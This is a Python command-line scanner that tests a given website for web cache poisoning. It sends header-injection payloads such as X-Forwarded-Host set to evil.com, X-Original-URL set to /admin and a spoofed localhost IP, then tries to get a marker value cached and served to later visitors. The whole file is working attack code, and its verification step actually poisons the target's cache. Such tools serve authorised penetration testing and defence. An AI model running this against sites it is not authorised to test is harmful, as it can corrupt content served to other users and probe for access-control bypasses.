import requests
import time
import sys
import random
import string
from typing import Dict, List, Tuple
from dataclasses import dataclass
from concurrent.futures import ThreadPoolExecutor
import argparse

@dataclass
class CacheTestResult:
    is_cached: bool
    time_to_cache: float
    vulnerable_headers: List[str]
    cache_control: str
    cache_hit_header: str

class CachePoisonTester:
    def __init__(self, target_url: str, verbose: bool = False):
        self.target_url = target_url
        self.verbose = verbose
        self.session = requests.Session()
        # Headers that might influence caching but aren't included in cache key
        self.test_headers = {
            'X-Forwarded-Host': 'evil.com',
            'X-Host': 'evil.com',
            'X-Forwarded-Server': 'evil.com',
            'X-HTTP-Host-Override': 'evil.com',
            'X-Forwarded-Proto': 'http',
            'X-Original-URL': '/admin',
            'X-Rewrite-URL': '/admin',
            'X-Custom-IP-Authorization': '127.0.0.1'
        }
        
    def generate_random_param(self) -> str:
        """Generate random parameter to bypass cache"""
        return ''.join(random.choices(string.ascii_letters + string.digits, k=8))

    def detect_cache_behavior(self) -> CacheTestResult:
        """Detect if target is using caching and determine cache timing"""
        print("[*] Detecting cache behavior...")
        
        # First request to prime cache
        param = self.generate_random_param()
        url = f"{self.target_url}?cb={param}"
        start_time = time.time()
        r1 = self.session.get(url)
        time1 = time.time() - start_time

        # Second request to same URL to check for caching
        start_time = time.time()
        r2 = self.session.get(url)
        time2 = time.time() - start_time

        # Check common cache headers
        cache_headers = [
            'X-Cache',
            'X-Cache-Hit',
            'CF-Cache-Status',
            'Age',
            'X-Cached'
        ]
        
        cache_hit_header = None
        for header in cache_headers:
            if header.lower() in r2.headers:
                cache_hit_header = f"{header}: {r2.headers[header]}"
                break

        is_cached = (time2 < time1 * 0.5) or cache_hit_header is not None
        
        return CacheTestResult(
            is_cached=is_cached,
            time_to_cache=time1,
            vulnerable_headers=[],
            cache_control=r1.headers.get('Cache-Control', 'Not Set'),
            cache_hit_header=cache_hit_header or 'Not Found'
        )

    def test_header_influence(self, header: str, value: str) -> Tuple[bool, requests.Response]:
        """Test if a specific header influences the response"""
        # Make request with test header
        r1 = self.session.get(
            self.target_url,
            headers={header: value}
        )
        
        # Make request without test header
        r2 = self.session.get(self.target_url)
        
        # Compare responses
        return (
            r1.text != r2.text or r1.status_code != r2.status_code,
            r1
        )

    def find_vulnerable_headers(self) -> List[str]:
        """Identify headers that influence the response"""
        print("[*] Testing for header influence...")
        vulnerable = []
        
        with ThreadPoolExecutor(max_workers=5) as executor:
            future_to_header = {
                executor.submit(self.test_header_influence, header, value): header
                for header, value in self.test_headers.items()
            }
            
            for future in future_to_header:
                header = future_to_header[future]
                try:
                    influences, response = future.result()
                    if influences:
                        vulnerable.append(header)
                        if self.verbose:
                            print(f"[+] Found influential header: {header}")
                except Exception as e:
                    print(f"[!] Error testing {header}: {str(e)}")

        return vulnerable

    def verify_cache_poisoning(self, vulnerable_headers: List[str]) -> bool:
        """Verify if cache poisoning is possible with identified headers"""
        print("[*] Verifying cache poisoning possibility...")
        
        if not vulnerable_headers:
            return False

        # Generate unique test value
        test_value = f"testpayload{self.generate_random_param()}"
        
        # Try to poison cache with each vulnerable header
        for header in vulnerable_headers:
            try:
                # Send poisoning request
                poison_headers = {header: test_value}
                r1 = self.session.get(self.target_url, headers=poison_headers)
                
                # Wait briefly for cache to update
                time.sleep(2)
                
                # Check if poisoned response is cached
                r2 = self.session.get(self.target_url)
                
                if test_value in r2.text:
                    print(f"[!] Cache poisoning confirmed with header: {header}")
                    return True
                    
            except Exception as e:
                print(f"[!] Error during verification: {str(e)}")
                
        return False

    def run_test(self) -> None:
        """Run complete cache poisoning test"""
        print(f"[*] Testing {self.target_url} for cache poisoning vulnerability")
        
        # Step 1: Detect cache behavior
        cache_result = self.detect_cache_behavior()
        
        if not cache_result.is_cached:
            print("[-] Target does not appear to be using caching")
            return
            
        print(f"[+] Cache detected:")
        print(f"    Cache-Control: {cache_result.cache_control}")
        print(f"    Cache Hit Indicator: {cache_result.cache_hit_header}")
        
        # Step 2: Find vulnerable headers
        vulnerable_headers = self.find_vulnerable_headers()
        
        if not vulnerable_headers:
            print("[-] No vulnerable headers found")
            return
            
        print(f"[+] Found {len(vulnerable_headers)} potentially vulnerable headers")
        
        # Step 3: Verify cache poisoning
        if self.verify_cache_poisoning(vulnerable_headers):
            print("[!] Target is VULNERABLE to web cache poisoning!")
            print("[!] Vulnerable headers:")
            for header in vulnerable_headers:
                print(f"    - {header}")
        else:
            print("[-] Could not confirm cache poisoning vulnerability")

def main():
    parser = argparse.ArgumentParser(description='Test for web cache poisoning vulnerabilities')
    parser.add_argument('url', help='Target URL to test')
    parser.add_argument('-v', '--verbose', action='store_true', help='Enable verbose output')
    args = parser.parse_args()

    try:
        tester = CachePoisonTester(args.url, args.verbose)
        tester.run_test()
    except KeyboardInterrupt:
        print("\n[!] Test interrupted by user")
        sys.exit(1)
    except Exception as e:
        print(f"[!] Error: {str(e)}")
        sys.exit(1)

if __name__ == "__main__":
    main()
